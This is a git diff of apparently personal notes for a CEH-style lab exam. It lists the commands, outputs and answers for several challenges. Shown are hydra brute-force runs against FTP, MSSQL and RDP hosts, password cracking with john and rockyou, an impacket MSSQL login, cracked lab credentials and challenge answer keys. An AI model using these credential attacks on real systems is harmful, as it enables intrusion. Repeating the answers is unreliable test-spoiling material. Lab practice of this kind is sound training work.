@@ -9,12 +9,13 @@ ping 192.168.10.222
 ping 192.168.10.144
 sudo find / -type f -iname 'password.txt' 2>/dev/null
 hydra -l nick -P /home/attacker/Desktop/password.txt ftp://192.168.10.111
-### INFO: [21] [ftp] host:192.168.10.111 login: nick password: apple
+### INFO: [21] [ftp] host: 192.168.10.111 login: nick password: apple
 
 ftp 192.168.10.111 # NOUTRO TERMINAL
 ### USERNAME: nick
 ### PASSWORD: apple
-ls
+#### ~/Desktop/52012.py
+ls  # CONECTADO VIA FTP
 get 52012.py
 cat 52012.py | grep www
 
@@ -24,7 +25,7 @@ cat 52012.py | grep www
 #### INFO: POST / HTTP/1.1 (application/x-www-form-urlencoded)
 #### HTML Form URL Encoded: application/x-www-form-urlencoded
 ####    Form item: "txtusername" == "kety"
-####    Form item: "txtpwdd" == "apple"
+####    Form item: "txtpwd" == "apple"
 
 # PART II - Challenge 3  💬ANSWER: Quake Network Protocol💬
 #### ~/Downloads/ServerDoS.pcapng
@@ -64,11 +65,10 @@ find ~ -type f -iname 'rockyou.txt' 2>/dev/null
 john --wordlist=/home/attacker/rockyou.txt a.txt
 ### INFO: c3ll0@123 (?)
 
-
 # PART II - Challenge 8  💬ANSWER: 7💬
 nmap -p 1433 192.168.10.0/24 --open
 hydra -L ~/Desktop/username.txt -P ~/Desktop/password.txt 192.168.10.144 mssql
-### INFO: [1433] [mssql] host:192.168.10.144 login: Server_mssrv password: Spidy
+### INFO: [1433] [mssql] host: 192.168.10.144 login: Server_mssrv password: Spidy
 find / -type f -name 'mssqlclient.py' 2>/dev/null
 python3 /root/impacket/examples/mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433
 
@@ -80,7 +80,7 @@ dir
 # PART II - Challenge 9  💬ANSWER: Pumpkin@1234💬
 nmap -p 3389 192.168.10.0/24 --open
 hydra -l Maurice -P /home/attacker/rockyou.txt 192.168.10.222 rdp
-### INFO: [3389] [rdp] host:192.168.10.222 login: Maurice password: Pumpkin@1234
+### INFO: [3389] [rdp] host: 192.168.10.222 login: Maurice password: Pumpkin@1234
 
 # ⚠️ PART II - Challenge 10  💬ANSWER: d282💬
 #### ~/Donwloads/Tools.rar
